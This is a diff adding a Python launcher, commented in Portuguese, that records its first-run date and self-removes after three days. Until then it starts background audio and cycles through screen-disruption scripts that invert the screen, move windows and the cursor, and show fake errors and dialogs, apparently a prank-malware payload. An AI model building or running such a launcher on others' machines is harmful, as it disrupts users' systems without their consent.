@@ -1,0 +1,133 @@
+"""import os
+import time
+import random
+import subprocess
+import signal
+
+# Lista dos scripts a serem executados
+scripts = [
+    "python Effects/BwHell.pyw",
+    "python Effects/CursorFollow.pyw",
+    "python Effects/Invert.pyw",
+    "python Effects/RainbowHell.pyw",
+    "python Effects/RandomErrors.pyw",
+    "python Effects/Rectangles.pyw",
+    "python Effects/Tunnel.pyw",
+    "python Effects/Void.pyw",
+    "python Effects/InvertScreen.pyw"
+]
+
+# Lista para armazenar os processos ativos
+active_processes = []
+
+# Função para executar o script de forma assíncrona
+def run_script(script):
+    # Lança o script e retorna o processo
+    process = subprocess.Popen(script, shell=True)
+    active_processes.append(process)  # Adiciona o processo à lista
+
+    # Se houver mais de 5 processos ativos, termina o mais antigo
+    if len(active_processes) > 5:
+        # Remove o processo mais antigo da lista
+        old_process = active_processes.pop(0)
+        # Usa os.kill para tentar terminar o processo mais antigo
+        try:
+            os.kill(old_process.pid, signal.SIGTERM)  # SIGTERM termina o processo
+            print(f"Processo {old_process.pid} terminado.")
+        except ProcessLookupError:
+            print(f"Processo {old_process.pid} não encontrado.")
+        except PermissionError:
+            print(f"Permissões insuficientes para terminar o processo {old_process.pid}.")
+
+# Tocar Musica de Fundo
+run_script("python Effects/audio.pyw")
+# Loop para executar os scripts de forma indefinida
+while True:
+    # Escolher um script aleatório da lista
+    script = random.choice(scripts)
+
+    # Executar o script em paralelo
+    run_script(script)
+    run_script("python Effects/MoveWindows.pyw")
+    run_script("python Effects/Listenner.pyw")
+    run_script("python Effects/InvertScreen.pyw")
+
+
+    # Aguardar um tempo aleatório entre 2 e 4 segundos
+    wait_time = random.randint(2, 4)
+    print(f"Aguardando {wait_time} segundos antes de executar o próximo script.")
+    time.sleep(wait_time)
+"""
+import subprocess, os
+from datetime import datetime, timedelta
+import time
+import random
+from random import shuffle
+
+#####################################################
+#    Verifica o tempo desde a primeira execução     #
+#####################################################
+
+home_user = os.environ['USERPROFILE']
+script_path = os.path.join(home_user, 'Portable', 'script_info.txt')
+# Armazena a data de execução
+try:
+    with open(script_path, 'r') as f:
+        execution_date_str = f.read().strip()
+        execution_date = datetime.fromisoformat(execution_date_str)
+except FileNotFoundError:
+    execution_date = datetime.now()
+    with open(script_path, 'w') as f:
+        f.write(execution_date.isoformat())
+
+# Verifica se passaram 5 dias
+if datetime.now() - execution_date > timedelta(days=3):
+    subprocess.Popen(rf"{home_user}\\Portable\\Remove.bat", shell=True)
+else:
+#####################################################
+
+    # Lista dos scripts a serem executados
+    scripts = [
+        "python Effects/BwHell.pyw",
+        "python Effects/CursorFollow.pyw",
+        "python Effects/Invert.pyw",
+        "python Effects/RainbowHell.pyw",
+        "python Effects/RandomErrors.pyw",
+        "python Effects/Rectangles.pyw",
+        "python Effects/Tunnel.pyw",
+        "python Effects/Void.pyw",
+        "python Effects/InvertScreen.pyw",
+        "python Effects/MoveCursor.pyw"
+    ]
+
+    # Função para executar o script de forma assíncrona
+    def run_script(script):
+
+        subprocess.Popen(script, shell=True)
+
+    # Executa o script audio.pyw em paralelo
+    subprocess.Popen("python Effects/audio.pyw", shell=True)
+    # Executa Em paralelo
+    run_script("python Effects/MoveWindows.pyw")
+    run_script("python Effects/Listenner.pyw")
+    run_script("python Effects/InvertScreen.pyw")
+    run_script("python Effects/DialogBoxes.pyw")
+
+    count = 0
+    # Loop para executar os scripts de forma indefinida
+    shuffle(scripts)
+    while count <= 9:
+        # Escolher um script aleatório da lista
+        #script = random.choice(scripts)
+
+        # Executar o script em paralelo
+        run_script(scripts[count])
+
+
+        # Aguardar um tempo aleatório entre 2 e 4 segundos
+        wait_time = random.randint(2, 4)
+        print(f"Aguardando {wait_time} segundos antes de executar o próximo script.")
+        time.sleep(wait_time)
+        count+=1
+
+
